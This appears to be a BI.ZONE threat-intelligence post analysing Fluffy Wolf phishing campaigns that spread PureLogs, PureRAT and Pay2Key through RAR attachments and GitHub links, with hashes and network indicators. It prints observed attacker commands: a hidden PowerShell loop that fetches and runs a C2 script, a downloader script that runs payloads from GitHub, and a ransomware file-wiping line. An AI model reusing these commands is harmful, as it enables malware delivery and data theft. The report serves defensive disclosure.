Fluffy Wolf tests new toolkit on Russian companies | by BI.ZONE | Jun, 2026 | Medium

# Fluffy Wolf tests new toolkit on Russian companies

BI.ZONE

4 days ago

Press enter or click to view image in full size

From March to May 2026, we uncovered a series of phishing attacks by Fluffy Wolf. The threat actor targeted Russian organizations across multiple sectors, including construction, consulting, manufacturing, engineering, retail, and e-commerce.

To deliver malware, the adversaries employed malicious email attachments and GitHub repository URLs that directed victims to infected archives. The cluster also relied on multiple loaders, droppers, and a downloader, including:

- PureCrypter
- Rust-based loader using Donut shellcode
- batch loader
- JavaScript loader
- previously undocumented PowerLoader

Like PureCoder tools (PureCrypter, PureLogs, and PureRAT), PowerLoader is marketed on underground resources under the malware-as-a-service (MaaS) model.

As final payloads, the threat actor deployed the PureLogs stealer, the PureRAT trojan, and the Pay2Key ransomware. Furthermore, one of the analyzed PureRAT samples contained PluginRemoteDesktop observed for the first time in attacks targeting Russian organizations.

## Key findings

- Fluffy Wolf uses GitHub repository URLs in phishing emails. Because such links appear legitimate, they help the attackers bypass email filtering and network security controls while increasing the likelihood that recipients will open them.
- While the group continues to rely on the same core payloads (PureLogs, PureRAT, and Pay2Key), it has shifted its focus toward evolving and diversifying delivery methods. The adversaries introduced the third-party PowerLoader downloader to improve the chances of successful compromise and evasion.
- We detected PluginRemoteDesktop for PureRAT, which had not previously been seen in attacks on Russian organizations.

## Phishing emails

In its phishing emails, Fluffy Wolf impersonated employees of legitimate organizations, urging recipients to review the attached documents related to alleged outstanding debts.

We have identified two phishing delivery methods:

- malicious RAR attachments
- URLs to attacker-controlled GitHub repositories, used to download such archives

The RAR files concealed loaders, droppers, and a downloader designed to deploy the PureLogs stealer, the Pay2Key ransomware, and the PureRAT trojan on compromised systems.

To distribute phishing emails, Fluffy Wolf used the mail.ru and yandex.ru mail services.

Observed phishing email subject lines included:

- Claim and reconciliation statement!!!!
- Reconciliation for signing !!!
- Reconciliation statement.rar
- Reconciliation statement
- Claim

Press enter or click to view image in full size

Phishing email with malicious attachment

Press enter or click to view image in full size

Phishing email with GitHub repository URL

Press enter or click to view image in full size

HTML code of phishing email containing GitHub repository URL

## GitHub repositories

During the investigation, our team identified several attacker-controlled GitHub accounts hosting multiple repositories with malicious RARs, executables (`.scr`, `.com`, `.exe`), reversed and Base64-encoded payloads stored in text files, and obfuscated batch and JS scripts.

### Repositories

- versachi2026 (buh2026, doc, max, max2, and rrr repositories):
- PowerLoader samples downloading PureCrypter instances to deploy PureLogs and PureRAT
- batch loader launching PowerShell to retrieve an encrypted injector and an encrypted PureRAT payload
- obfuscated JS loaders
- Base64-encoded malicious payloads
- PureCrypter samples deploying PureRAT and PureLogs on target systems
- yulyaigonina (buh, document, and 222 repositories):
- PureCrypter delivering Pay2Key and PureRAT
- PureCrypter injecting PureRAT into `InstallUtil.exe`
- PureCrypter dropper injecting PureRAT into `RegAsm.exe` while displaying a PDF decoy; the analysis of one such sample revealed previously unseen PluginRemoteDesktop for PureRAT
- PureCrypter injecting PureRAT into `RegAsm.exe`
- komplekt26 (adguardVPNInstaller repository):
- It was unavailable at the time of the research.
- Retrospective analysis revealed that it hosted an archive containing PureCrypter which injected PureRAT into `InstallUtil.exe` and installed the legitimate WinRAR 7.22.0 archiver on the compromised host to distract the victim.

> At the time of this research, none of the above GitHub repositories were available

## Attack chain scenarios

A typical attack chain unfolds as follows:

1. A victim opens an email attachment containing a malicious archive with a PE file (`.com`/`.scr`/`.exe`) or a script and executes the embedded malware/script. In other cases, a user clicks a URL in a phishing email, which downloads a malicious archive from a GitHub repository to disk. The downloaded file is then manually opened by the user.
2. Depending on the dropper/loader/downloader type, the infection chain may unfold in different ways.

Scenario 1

The attack begins with the execution of a dropper that extracts a Rust-based loader into a certain directory (e.g., `%TEMP%`). Once launched, the loader unpacks and runs Donut shellcode directly in memory. Donut is a position-independent shellcode generator that supports in-memory execution of .NET assemblies, scripts, and other shellcode types. After the Donut shellcode is initialized, PureCrypter code is loaded into the current process memory, and control is transferred to it. PureCrypter ultimately decrypts and launches the final payload stored within the assembly resources.

Scenario 2

In another scenario, the PE file embedded in the archive is itself a PureCrypter sample. Once executed, it immediately injects malicious code into a target process. There also are lightweight PureCrypter droppers/loaders designed solely to save and launch PureCrypter from disk. Our team identified a dropper that wrote PureCrypter to `%APPDATA%\Microsoft\Windows\Templates` and then ran it. Common target processes used for payload injection include `RegAsm.exe`, `InstallUtil.exe`, and `MSBuild.exe`.

Scenario 3

Another infection chain involves the previously undocumented PowerLoader downloader/dropper written in C++. When executed, it launches PowerShell in hidden mode with command-line arguments designed to retrieve a PowerShell script from the C2 server. That script then downloads PureCrypter onto the compromised host. After the PureCrypter files are downloaded and written to a designated directory (e.g., `%TEMP%`), they are executed. PureCrypter eventually launches the final payload.

Example of the full PowerShell command line executed by PowerLoader:

```
powershell.exe -WindowStyle Hidden -Command "while(1){try{irm 'http://%IP%:%PORT%/script?id=%ID%&country=RU&admin=true'|iex}catch{};Start-Sleep -Seconds 60}"
```

Example of a PowerShell script returned by the C2 server:

```
# Download & Save to Disk$url = 'https://github.com/versachi2026/%Path%'$out = "$env:TEMP\%Name%.exe"(New-Object Net.WebClient).DownloadFile($url, $out)Start-Process $out # Download & Execute (in-memory)$url = 'https://github.com/versachi2026/%Path%'IEX((New-Object Net.WebClient).DownloadString($url)) # Download & Save to Disk$url = 'https://github.com/versachi2026/%Path%'$out = "$env:TEMP\%Name%.exe"(New-Object Net.WebClient).DownloadFile($url, $out)Start-Process $out
```

Scenario 4

In this scenario, a batch script launches PowerShell with a lengthy Base64-encoded command passed as an argument. Within the PowerShell session, a script is executed that fetches a file containing a Base64-encoded .NET assembly from a remote resource. The downloaded assembly functions as a loader responsible for injecting malicious code into the address space of a trusted process (e.g., `MSBuild.exe`). The malicious code is retrieved from a GitHub repository as a Base64-encoded payload, then decrypted and injected into a target process. Observed payloads currently comprise three malware families: PureLogs, Pay2Key, and PureRAT.

### PureLogs

Fluffy Wolf continues to widely use the PureLogs stealer in its campaigns. The malware is designed to harvest large volumes of data, including browser credentials, history, and cookies, as well as retrieve information from email clients, FTP services, and other applications. One notable characteristic of recent campaigns is the use of dedicated endpoint URLs for different categories of stolen data.

For example:

```
hxxps://5.252.153[.]67:8443/userinfo (user and system information)hxxps://5.252.153[.]67:8443/browser (browser credentials)hxxps://5.252.153[.]67:8443/discord (Discord application data)
```

This differentiation likely allows the adversaries to categorize and process exfiltrated information more efficiently on the C2 server, streamlining subsequent analysis.

### Pay2Key ransomware

Fluffy Wolf still employs the Pay2Key ransomware (based on Mimic). During the analysis of one of the samples, we observed Pay2Key deployment on a compromised host.

`doc_06052026_buh_akt.rar` contains the `doc_06052026_buh_akt.exe` PE executable. Once launched, the malware creates two Pay2Key PE files in the following directories:

- `%USERPROFILE%\Desktop`
- `%LOCALAPPDATA%\{DB0E178A-8261-A6FA-2FBA-43F520C6A451}`

The files are saved as `static-i386-amd64.exe` and `browser.exe`. The malware then runs `static-i386-amd64.exe`. Although the victim is shown an error message, the file encryption process continues uninterrupted.

Error message

The `{DB0E178A-8261-A6FA-2FBA-43F520C6A451}` directory is blocked for users. Attempts to open it via standard Windows tools such as File Explorer or CMD result in Access Denied messages. This is done to conceal the second ransomware component, along with ZIP files copied from a victim’s desktop and its subdirectories. The archives are saved to the same directory. In addition, the Pay2Key sample employs `fsutil` to fill its own file with zeros before deleting it via the `del` command. This anti-forensics technique reduces the likelihood of DFIR specialists recovering the original ransomware for analysis.

Excerpt from the executed command:

```
ping 127.2 -n 5 & fsutil file setZeroData offset=0 length=20000000 %USERPROFILE%\Desktop\static-i386-amd64.exe & cd /d %USERPROFILE%\Desktop & Del /f /q /a
```

Encrypted files are assigned the `.ywgulm_p2k` extension. The malware also drops the `HowToRestoreFiles.txt` ransom note in `C:\temp`, which contains instructions in Russian, English, and Spanish. To make sure the victim reads it, Pay2Key adds `browser.exe` with the `notepad.exe "C:\temp\HowToRestoreFiles.txt"` value to the Windows startup registry key `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`.

Press enter or click to view image in full size

`HowToRestoreFiles.txt` ransom note

After encryption is complete, another malicious component (PureRAT) is launched, with its code injected into `RegAsm.exe`.

### PureRAT

This RAT just as widely used in Fluffy Wolf campaigns as the PureLogs stealer. Recent activity revealed several new capabilities.

1. We identified PluginRemoteDesktop for PureRAT, which had not previously been observed in attacks targeting Russian organizations. The plug-in enables remote interaction with the desktop and windows on a compromised host. Its capabilities include capturing desktop images, collecting lists of open windows (including the currently active one), controlling keyboard and mouse input, and sending messages to windows. Effectively, this plug-in significantly expands PureRAT’s capabilities. It relies on multiple WinAPI functions, including SetCursorPos, SendInput, GetMessageExtraInfo, PostMessage, IsWindowVisible, EnumDesktopWindows, keybd_event, GetForegroundWindow, OpenDesktop, CloseDesktop, and GetCursorInfo.
2. We uncovered several unusual configurations among the PureRAT samples delivered to compromised systems. Typically, the Campaign ID field roughly matches the malware distribution date. For example, in attacks observed on May 5, 2026, the field contained `05052026`. However, in two samples (`document_06052026 - Copy.scr` and `document_06052026_1.scr`), the Campaign ID field was set to `06052029`. We assume the threat actor accidentally specified the year 2029 instead of 2026.
3. There are also indications that Fluffy Wolf regularly updates its .NET Reactor version. This protector is applied both to the PureCrypter loader and the final payloads, including PureLogs and PureRAT. This likely reflects an ongoing effort to further obstruct malware analysis.
4. For the first time, we identified samples employing the `скан_20190702 (2).pdf`(scan) decoy disguised as a lease invoice. Some samples save this file to `%USERPROFILE%\Desktop` and open it to distract the victim, while others do not exhibit such behavior.

Press enter or click to view image in full size

PDF decoy

### PowerLoader

While analyzing one of the PowerLoader samples (`doc_08042026_buh_akt_PDF.scr`) hosted on `5.252.153[.]67:60070`, we uncovered a PowerLoader control panel. Notably, Fluffy Wolf often uses the `5.252.153[.]67` IP address as its C2 server for other malware instances (PureLogs and PureRAT).

Press enter or click to view image in full size

PowerLoader administration panel

Further monitoring of underground resources revealed a post advertising the PowerLoader dropper/downloader. According to the seller, the malware is capable of effectively bypassing antivirus detection and features built-in obfuscation, unique signatures per build, indirect syscalls, hidden imports, fileless execution, and other mechanisms. The pricing was listed at $100 per build and $20 per rebuild.

Press enter or click to view image in full size

Sales post excerpt

Press enter or click to view image in full size

Description of PowerLoader features

Press enter or click to view image in full size

Excerpt from PowerShell command line used to retrieve scripts from C2 server

Press enter or click to view image in full size

Excerpt from PowerShell scripts used to download malicious components to host

The screenshots published by the seller demonstrate a script structure consistent with that observed in PowerLoader samples attributed to Fluffy Wolf. Moreover, the commands used to retrieve PowerShell scripts from the C2 server closely resemble those seen in active campaigns.

The use of this newly identified downloader — advertised for sale on underground forums since April 2026 — suggests the ongoing evolution and upgrade of the threat actor’s toolkit. Fluffy Wolf continues to adopt new components to hinder the analysis, detection, and attribution of its activities.

## Checksums

RARs

- `2e1bd5aa28b63baea57be0ddf4eafaafef07dc59c3273d75513354a3f00aaeae`
- `aa34fcbd1a948b25f16f44142289e12e411671f58ffed1ed723b1a92f56d9e09`
- `1f135fc93810dbca2dce4827db52ce2c86fd94616594d42b7db183d09338eefb`
- `f3d31b6f21ad20a659172febb6ba77638d5721b2e837c3fa285b1519723292d2`
- `47f131a73681804ce81154a9397a34c47d66b6c740f92d2072372742b1f4d573`
- `a0d242ba07c6b2607eb5b8ba2ba2156df9dd7a06919af59dda4198fa64846854`
- `58c8af6819d61e55dab218c38baced6d952a733fe6b625f4e3c5664a6a224501`
- `c5ac346e5e09ab33598c84bf34d618cbfb89fc3028f33a0bc51e5bc9c97efab5`
- `b9318833e9ad4094bb3cd7fa76eb028bcafd65fc22cdb1e57e828a0651792f1e`
- `f833236b43cfa6d69b6ceadae649c5c970e6e1b32fd3d3d0e5ccc4faa433e68f`
- `e57fad8f15423c5a34e337136f2f1b2c6948b8caee8ec047e85882e6e9e97621`
- `7c86b45309989b3dc7f07f1e08d9e95ea23f128614c76e76c073fe6785c576be`
- `9a4811bc0a14e9dd05554f85c7943ad664590975fe9a2d1f7d3453448534eff3`
- `ee1cf4e463bcca1d332510874c71b1623d98655010a923127d1dda9787fc85c2`

Rust loaders

SFX extractor

`f2f519009fbf68aed3b2011f10af1d85eddcd904bddbd9c9f5da079f125ba4af`

PowerLoader

`2bd0667301cb43be4f4f413f888b23e871d623e7b1cad25a744a5b21de0253be`

PureCrypter

- `70e5b8a57d97eef3bdb41f296c05c95fb8bb21409a984edffb1e7ed484ad3339`
- `9e8cfc30a920e1889dcf91fb6e589442d68538d31ce1ecc362e187df5b3a6dfa`
- `5f61676739173cbc4d8b3307dc2e1084454481a793f6890b0f25d290b13a9ecd`
- `490b591b75e4f70bf6f11be5af2a594255ba50068b8a4331a11b6a45bf4fd61c`
- `0d351f0acc0e642a101c58a3ee67affdb56ad4e1eb2abdb13869e1e79a000b20`
- `6bd486cfbaef5bcf2102a0d2009274af1db804fb409f2f36b7a765457b3553db`
- `ad34363cef40f07aca51d9b5c5efc5a4d64aafdda655a42b4b0cf2a686af189f`
- `bdab0d5ba9a45590d6098d1faeaa3c515ef600d34e7dec4a187449e86a195ed9`
- `0dafc7f545b5338dcdad3c33691bf600aefb67d20409928b26359a019159c07a`
- `1e6504c2f3b61296ba1d1604ff1ad914b3bf66a53e3ee48f51a27185ff505c37`
- `e8804fe935844a799a9b723e320b12136c42b0943a9577d8b23f10060e788d76`
- `3468acd6e340e1418a94dab6c60b77985b8a4b1662a19e8d47a582e84a852cd1`
- `7dc7c6d5cc65f48bc227e2d8d167c3a7d57d9c4f262bb3b61272958e14bff1e4`

Batch loader

`36512147ca91a464e76e01f90e046c1ed6b82c94aaa7b457e0c48f0fef651717`

Droppers/downloaders

- `aff1a5be3885907e61b61fcef03c4eb8e7a86255bb9963a0f2095cd69bb2f6d7`
- `d152c06a63fdb76851eab8c50b4f2db7b5a45568034800e883e509eb008c3261`
- `8140916d84d3995245459da20e1bf5eccf7e1bea53771352cc714441ecf1ba84`
- `6338c373f170da6cf01729aeba4d23419d8219b63674b5491ef3b6a1fd140b1c`

JS loaders

- `dc5e6cc144723aa34491ca91f47c1bb8817ac779e6e7bb02eb1c895bb488101c`
- `d462edfd28489ed3de667f0891a3719d717f63ad192ec9cb601901d2395826e6`
- `f035a44d3d45288a142aa9ef6ab21bb1f88b37cc205dc6f3555c0618180ed52f`

Pay2Key

`328dbb06c64422010bb81aa3ed37a62c4110490833dc5109812e730588a58d1c`

## Network indicators

URLs

- `hxxps://dpaste[.]com/3VY69RY7J.txt`
- `hxxps://hasteb[.]in/ii5PfCz83aTcDgK`
- `hxxps://github[.]com/versachi2026/buh2026/raw/refs/heads/main/pretenziya_14042026_87-325689.rar`
- `hxxps://github[.]com/komplekt26/adguardVPNInstaller/raw/refs/heads/main/Document_PRETENZIYA_13052026.rar`
- `hxxps://github[.]com/yulyaigonina/document/raw/refs/heads/main/doc_06052026_buh_akt.rar`
- `hxxps://github[.]com/yulyaigonina/pochta/raw/refs/heads/main/isc_trebovanie_08052026.rar`
- `hxxps://github[.]com/versachi2026/rrr/raw/refs/heads/main/STL0804.exe`
- `hxxps://github[.]com/versachi2026/rrr/raw/refs/heads/main/VC08042026.exe`
- `hxxps://github[.]com/versachi2026/rrr/raw/refs/heads/main/VC08042026.exe`
- `hxxps://raw.githubusercontent[.]com/versachi2026/max/refs/heads/main/VC29032026upload.txt`
- `hxxps://github[.]com/versachi2026/buh2026/raw/refs/heads/main/VC13042026.exe`
- `hxxps://github[.]com/versachi2026/buh2026/raw/refs/heads/main/STLNEWKRIp.exe`
- `hxxp://5.252.153[.]67:60070/script?id=%GUID%&country=RU&admin=true`

IP addresses

- `91.84.118[.]179`
- `5.252.153[.]67`
- `195.2.67[.]129`

## MITRE ATT&CK

Press enter or click to view image in full size

## How to protect your company from such threats

Fluffy Wolf relies on phishing emails with malicious attachments and GitHub repository URLs to deliver malware. Solutions like BI.ZONE Mail Security can help block these threats at the perimeter. The tool employs more than 100 filtering mechanisms, including machine vision, YARA rules, and methods of statistical, signature, linguistic, content, and heuristic analysis. The solution leverages several AI models alongside built-in protection against server auto-reply loops and bounce messages. This approach allows organizations to filter out unwanted messages without slowing down the delivery of secure ones.

Staying proactive requires an understanding of the methods and tools used by adversaries. The BI.ZONE Threat Intelligence portal provides up-to-date details on attackers, their tactics, techniques, tools, along with threat detection recommendations. This enables organizations to integrate cyber threat intelligence into their security operations and prevent future incidents.

### This is the skill you should prepare yourself for BEFORE day one as a SOC Analyst

## How I Reclaimed 120GB of Mac Storage in 5 Minutes (Without Deleting Personal Files)

### Generic guides tell you to empty your trash. Here is the actual guide to hunting down the invisible developer tools and hidden macOS system…